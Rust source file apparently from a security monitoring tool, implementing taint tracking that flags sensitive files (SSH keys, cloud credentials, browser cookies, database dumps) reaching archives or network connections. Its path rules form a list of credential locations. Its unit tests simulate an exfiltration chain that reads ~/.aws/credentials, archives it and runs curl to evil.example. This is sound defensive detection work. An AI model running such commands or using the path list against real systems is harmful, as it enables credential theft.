//! Data-flow taint tracking across processes and artifacts.
//!
//! LabTrace's differentiator: rules alone fire on single events; taint analysis
//! connects them. Sensitive data (credentials, keys, SSH sockets, browser
//! cookies, cloud tokens) is marked at source; every file write, pipe, exec
//! argument and network connection propagates it. A finding is born when taint
//! reaches a sink (the internet, a new binary, an archive, a shell).

use crate::event::Event;
use crate::proctree::ProcTree;
use serde::Serialize;
use std::collections::{BTreeMap, BTreeSet};

/// What kind of sensitive source got tainted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub enum TaintKind {
    Credentials,
    CryptoKey,
    SessionToken,
    CloudCredentials,
    DatabaseDump,
    PersonalData,
}

impl TaintKind {
    pub fn label(&self) -> &'static str {
        match self {
            TaintKind::Credentials => "credentials",
            TaintKind::CryptoKey => "crypto-key",
            TaintKind::SessionToken => "session-token",
            TaintKind::CloudCredentials => "cloud-credentials",
            TaintKind::DatabaseDump => "database-dump",
            TaintKind::PersonalData => "personal-data",
        }
    }
}

/// A tainted entity: process, file or connection.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub struct TaintId {
    pub kind: TaintKind,
    pub origin_pid: u32,
    /// File path or "net:<ip:port>" — what carries the taint.
    pub carrier: String,
}

#[derive(Debug, Default)]
pub struct TaintState {
    /// Tainted carriers (files, sockets, processes by cmdline marker).
    pub tainted: BTreeSet<TaintId>,
    /// Which pids currently hold taint (can propagate further).
    pub tainted_pids: BTreeMap<u32, BTreeSet<TaintKind>>,
}

/// Rules that mark sources of sensitive data.
fn source_kinds_for_path(path: &str) -> Vec<TaintKind> {
    let p = path.to_ascii_lowercase();
    let mut out = Vec::new();
    if p.contains("/id_rsa") || p.contains("/id_ed25519") || p.ends_with(".pem") || p.contains(".ssh/authorized_keys") {
        out.push(TaintKind::Credentials);
    }
    if p.contains("/.ssh/control") || p.contains("/ssh-agent") || p.ends_with(".gnupg") {
        out.push(TaintKind::Credentials);
    }
    if p.contains(".aws/credentials") || p.contains(".config/gcloud") || p.contains(".azure/") || p.contains(".kube/config") {
        out.push(TaintKind::CloudCredentials);
    }
    if p.ends_with(".kdbx") || p.contains(".gnupg/") || p.contains("/keystore") || p.ends_with(".p12") || p.ends_with(".pfx") {
        out.push(TaintKind::CryptoKey);
    }
    if p.contains(".env") && !p.contains("/proc/") {
        out.push(TaintKind::Credentials);
    }
    if p.contains("cookies") || p.contains("/login-data") || p.contains(".mozilla/") || p.contains(".config/google-chrome") {
        out.push(TaintKind::SessionToken);
    }
    if p.ends_with(".sql") || p.contains(".mysql/history") || (p.contains("dump") && p.ends_with(".gz")) {
        out.push(TaintKind::DatabaseDump);
    }
    if p.contains(".csv") && (p.contains("customer") || p.contains("user") || p.contains("klient")) {
        out.push(TaintKind::PersonalData);
    }
    out
}

/// Sinks: where tainted data should never end up.
fn is_network_sink(target: &str) -> bool {
    // any outbound connection is a potential exfiltration sink
    target.contains(':')
}

fn is_archive_sink(target: &str) -> bool {
    let t = target.to_ascii_lowercase();
    t.ends_with(".tar") || t.ends_with(".tar.gz") || t.ends_with(".tgz") || t.ends_with(".zip") || t.ends_with(".7z")
}

#[derive(Debug, Clone, Serialize)]
pub struct TaintFlow {
    pub taint: TaintId,
    /// pid where taint reached the sink
    pub sink_pid: u32,
    /// event index (seq) of the sink event
    pub sink_seq: u64,
    pub sink_kind: String,
    pub sink_target: String,
    /// rendered process chain for the report
    pub chain: String,
}

/// Run taint propagation over the event stream. Returns ordered flows where
/// sensitive data reached a sink.
pub fn analyze(events: &[Event], tree: &ProcTree) -> Vec<TaintFlow> {
    let mut st = TaintState::default();
    let mut flows = Vec::new();

    for e in events {
        if !e.success {
            continue;
        }
        match e.kind.as_str() {
            "exec" => {
                // process inherits taint of its parent; exec with tainted path
                // in argv also propagates (e.g. `tar -cf out.tgz /home/user/.aws`)
                let mut kinds: BTreeSet<TaintKind> = st.tainted_pids.get(&e.ppid).cloned().unwrap_or_default();
                for carrier in carriers_in_cmdline(&e.cmdline) {
                    for k in st.tainted.iter().filter(|t| t.carrier == carrier).map(|t| t.kind).collect::<Vec<_>>() {
                        kinds.insert(k);
                    }
                    // touching a sensitive source file directly taints
                    for k in source_kinds_for_path(&carrier) {
                        kinds.insert(k);
                        st.tainted.insert(TaintId { kind: k, origin_pid: e.pid, carrier: carrier.clone() });
                    }
                }
                if !kinds.is_empty() {
                    st.tainted_pids.insert(e.pid, kinds.clone());
                }
            }
            "file" => {
                // reading a sensitive file taints the reader and the carrier
                let path = e.target.clone();
                let src_kinds = source_kinds_for_path(&path);
                if !src_kinds.is_empty() {
                    for k in &src_kinds {
                        st.tainted.insert(TaintId {
                            kind: *k,
                            origin_pid: e.pid,
                            carrier: path.clone(),
                        });
                    }
                    let entry = st.tainted_pids.entry(e.pid).or_default();
                    for k in src_kinds {
                        entry.insert(k);
                    }
                    // written output inherits taint if the process holds any
                    if let Some(held) = st.tainted_pids.get(&e.pid) {
                        for k in held.clone() {
                            st.tainted.insert(TaintId {
                                kind: k,
                                origin_pid: e.pid,
                                carrier: path.clone(),
                            });
                        }
                    }
                } else if let Some(held) = st.tainted_pids.get(&e.pid).cloned() {
                    // tainted process wrote a file → file is tainted (staging)
                    for k in &held {
                        st.tainted.insert(TaintId {
                            kind: *k,
                            origin_pid: e.pid,
                            carrier: path.clone(),
                        });
                    }
                    // archive sink
                    if is_archive_sink(&path) {
                        for k in &held {
                            flows.push(flow(e, tree, *k, path.clone(), "archive-write"));
                        }
                    }
                }
            }
            "net-connect" => {
                let held = st
                    .tainted_pids
                    .get(&e.pid)
                    .cloned()
                    .or_else(|| st.tainted_pids.get(&e.ppid).cloned()) // first observation: inherit from parent
                    .unwrap_or_default();
                if !held.is_empty() {
                    if is_network_sink(&e.target) {
                        for k in held {
                            flows.push(flow(e, tree, k, e.target.clone(), "net-exfil"));
                        }
                    }
                }
            }
            _ => {}
        }
    }
    flows
}

fn carriers_in_cmdline(cmdline: &str) -> Vec<String> {
    cmdline
        .split_whitespace()
        .filter(|tok| tok.contains('/') && source_kinds_for_path(tok).len() > 0)
        .map(|s| s.to_string())
        .collect()
}

fn flow(e: &Event, tree: &ProcTree, kind: TaintKind, target: String, sink_kind: &str) -> TaintFlow {
    TaintFlow {
        taint: TaintId {
            kind,
            origin_pid: e.pid,
            carrier: String::new(),
        },
        sink_pid: e.pid,
        sink_seq: e.seq,
        sink_kind: sink_kind.into(),
        sink_target: target,
        chain: tree.chain_str(e.pid),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(seq: u64, pid: u32, ppid: u32, kind: &str, exe: &str, target: &str, cmdline: &str) -> Event {
        Event {
            seq,
            ts: String::new(),
            epoch: None,
            pid,
            ppid,
            uid: 0,
            kind: kind.into(),
            exe: exe.into(),
            cmdline: cmdline.into(),
            target: target.into(),
            success: true,
            extra: BTreeMap::new(),
        }
    }

    #[test]
    fn exfiltration_chain_detected() {
        let evs = vec![
            ev(1, 100, 1, "exec", "/bin/sh", "", "sh"),
            ev(2, 100, 1, "file", "/bin/cat", "/home/u/.aws/credentials", "cat ~/.aws/credentials"),
            ev(3, 100, 1, "file", "/bin/tar", "/tmp/staging.tar.gz", "tar -czf /tmp/staging.tar.gz"),
            ev(4, 100, 1, "net-connect", "/usr/bin/curl", "185.199.108.153:443", "curl https://evil.example"),
        ];
        let tree = ProcTree::build(&evs);
        let flows = analyze(&evs, &tree);
        assert!(flows.iter().any(|f| f.sink_kind == "net-exfil" && matches!(f.taint.kind, TaintKind::CloudCredentials)));
        assert!(flows.iter().any(|f| f.sink_kind == "archive-write"));
    }

    #[test]
    fn clean_activity_has_no_flows() {
        let evs = vec![
            ev(1, 100, 1, "exec", "/usr/bin/curl", "", "curl example.com"),
            ev(2, 100, 1, "net-connect", "/usr/bin/curl", "93.184.216.34:443", "curl example.com"),
        ];
        let tree = ProcTree::build(&evs);
        assert!(analyze(&evs, &tree).is_empty());
    }

    #[test]
    fn taint_inherits_to_child() {
        let evs = vec![
            ev(1, 50, 1, "file", "/bin/cat", "/home/u/.ssh/id_rsa", "cat id_rsa"),
            ev(2, 60, 50, "net-connect", "/usr/bin/wget", "10.0.0.9:8080", "wget"),
        ];
        let tree = ProcTree::build(&evs);
        let flows = analyze(&evs, &tree);
        assert!(flows.iter().any(|f| f.sink_pid == 60));
    }
}
